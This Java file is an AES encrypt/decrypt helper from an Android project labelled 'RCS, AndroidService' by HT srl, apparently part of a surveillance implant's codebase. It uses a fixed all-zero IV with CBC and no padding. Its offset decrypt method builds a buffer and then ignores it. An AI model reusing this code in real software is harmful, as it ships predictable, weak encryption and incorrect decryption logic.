/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Crypto.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.crypto;

import java.security.NoSuchAlgorithmException;

import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import android.util.Log;

import com.android.service.auto.Cfg;
import com.android.service.util.Check;

// TODO: Auto-generated Javadoc
/**
 * http://www.androidsnippets.org/snippets/39/index.html
 * 
 * @author zeno
 * 
 */
public class Crypto {

	/** The Constant TAG. */
	private static final String TAG = "Crypto";

	/** The aes_key. */
	private final byte[] aes_key;

	/** The skey_spec. */
	private final SecretKeySpec skey_spec;

	/** The iv spec. */
	private final IvParameterSpec ivSpec;

	/** The cipher. */
	Cipher cipher;

	/**
	 * Instantiates a new crypto.
	 *
	 * @param key the key
	 * @throws NoSuchAlgorithmException the no such algorithm exception
	 * @throws NoSuchPaddingException the no such padding exception
	 */
	public Crypto(final byte[] key) throws NoSuchAlgorithmException,
			NoSuchPaddingException {
		aes_key = new byte[key.length];
		System.arraycopy(key, 0, aes_key, 0, key.length);
		skey_spec = new SecretKeySpec(aes_key, "AES");

		final byte[] iv = new byte[16];

		for (int i = 0; i < 16; i++) {
			iv[i] = 0;
		}

		ivSpec = new IvParameterSpec(iv);

		cipher = Cipher.getInstance("AES/CBC/NoPadding");
	}

	/**
	 * Encrypt.
	 * 
	 * @param clear
	 *            the clear
	 * @return the byte[]
	 * @throws Exception
	 *             the exception
	 */
	public byte[] encrypt(final byte[] clear) throws Exception {

		cipher.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
		final byte[] encrypted = cipher.doFinal(clear);
		return encrypted;
	}

	/**
	 * Decrypt.
	 * 
	 * @param encrypted
	 *            the encrypted
	 * @return the byte[]
	 * @throws Exception
	 *             the exception
	 */
	public byte[] decrypt(final byte[] encrypted) throws Exception {
		// final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
		cipher.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
		final byte[] decrypted = cipher.doFinal(encrypted);
		return decrypted;
	}

	/**
	 * Decrypt.
	 * 
	 * @param encrypted
	 *            the encrypted
	 * @param offset
	 *            the offset
	 * @return the byte[]
	 * @throws Exception
	 *             the exception
	 */
	public byte[] decrypt(final byte[] encrypted, final int offset)
			throws Exception {
		if (offset < 0 || encrypted.length < offset) {
			return null;
		}

		// final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
		cipher.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);

		if (offset == 0) {
			return cipher.doFinal(encrypted);
		} else {
			final byte[] buffer = new byte[encrypted.length - offset];
			System.arraycopy(encrypted, offset, buffer, 0, encrypted.length
					- offset);
			return cipher.doFinal(encrypted);
		}
	}

	// COMPAT
	/**
	 * Decrypt.
	 * 
	 * @param cypher
	 *            the cypher
	 * @param plain
	 *            the plain
	 */
	public void decrypt(final byte[] cypher, final byte[] plain) {

		try {
			final byte[] buffer = decrypt(cypher);
			Check.asserts(plain.length == buffer.length,
					"different size buffers");

			System.arraycopy(buffer, 0, plain, 0, buffer.length);
		} catch (final Exception e) {
			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + e.toString());
		}

	}

}
